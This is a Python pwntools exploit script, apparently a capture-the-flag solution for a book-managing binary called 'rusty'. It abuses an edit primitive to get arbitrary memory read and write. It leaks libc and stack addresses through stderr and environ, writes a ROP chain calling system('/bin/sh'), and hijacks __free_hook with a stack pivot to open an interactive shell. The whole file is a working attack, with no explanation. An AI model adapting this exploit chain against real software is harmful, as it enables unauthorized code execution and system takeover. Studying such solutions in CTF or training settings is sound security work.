#!/usr/bin/env python2
import logging
from pwn import *

HOST = "127.0.0.1"
PORT = 7000

def add_book(book_name, pages):
    p.sendlineafter("----------", "1")
    p.sendlineafter("name:", book_name)
    i = 0
    for page in pages:
        i += 1
        p.sendlineafter("page:", str(page))
        if i == len(pages):
            p.sendlineafter("More?", "n")
        else:
            p.sendlineafter("More?", "y")


def edit_book(idx, book_name, pages):
    p.sendlineafter("----------", "2")
    p.sendlineafter("book:", str(idx))
    p.sendlineafter("name:", book_name)
    i = 0
    for (page_index, page) in pages:
        i += 1
        p.sendlineafter("page:", str(page_index))
        p.sendlineafter("page:", str(page))
        if i == len(pages):
            p.sendlineafter("More?", "n")
        else:
            p.sendlineafter("More?", "y")


def list_books():
    p.sendlineafter("----------", "3")
    print p.recvuntil("1. Add book")


def show_book(idx):
    p.sendlineafter("----------", "4")
    p.sendlineafter("book:", str(idx))
    print p.recvuntil("1. Add book")


def leak_addr(idx):
    p.sendlineafter("----------", "4")
    p.sendlineafter("book:", str(idx))
    p.recvuntil("Pages: [")
    leak = int(p.recvuntil((",", "]"), drop=True))
    return leak


def exploit():
    for _ in range(9):
        add_book("book1", [12345678]*49)

    leak = leak_addr(8)
    log.info("leak 0x{:x}".format(leak))
    edit_book(8, "book1", [(3, leak-0x2b48)])

    stderr_leak = leak_addr(0)
    log.info("stderr_leak 0x{:x}".format(stderr_leak))

    libc.address = stderr_leak - libc.symbols["_IO_2_1_stderr_"]
    log.info("libc 0x{:x}".format(libc.address))

    edit_book(8, "book1", [(3, libc.symbols["environ"])])
    environ = leak_addr(0)
    log.info("environ 0x{:x}".format(environ))

    rop_loc = environ - 0x218

    log.info("rop_loc 0x{:x}".format(rop_loc))
    rop = ROP(libc)
    rop.system(next(libc.search('/bin/sh\x00')))

    i = 0
    for r in rop.build():
        edit_book(8, "book1", [(3, rop_loc+i)])
        edit_book(0, "book1", [(0, r)])
        i += 8

    # add rsp, 0x240; pop rbx; pop rbp; pop r12; ret;
    mov_rsp = libc.address + 0x0000000000040568
    log.info("mov_rsp 0x{:x}".format(mov_rsp))

    edit_book(8, "book1", [(3, libc.symbols["__free_hook"])])
    edit_book(0, "book1", [(0, mov_rsp)])

    p.interactive()


if __name__ == "__main__":
    name = "./src/rusty"
    binary = ELF(name, checksec=False)

    libc_name = "./src/libc.so"
    libc = ELF(libc_name, checksec=False)

    context.terminal = ["tmux", "sp", "-h"]
    context.arch = "amd64"

    if len(sys.argv) > 1:
        p = remote(HOST, PORT)
    else:
        p = process(name)

    exploit()
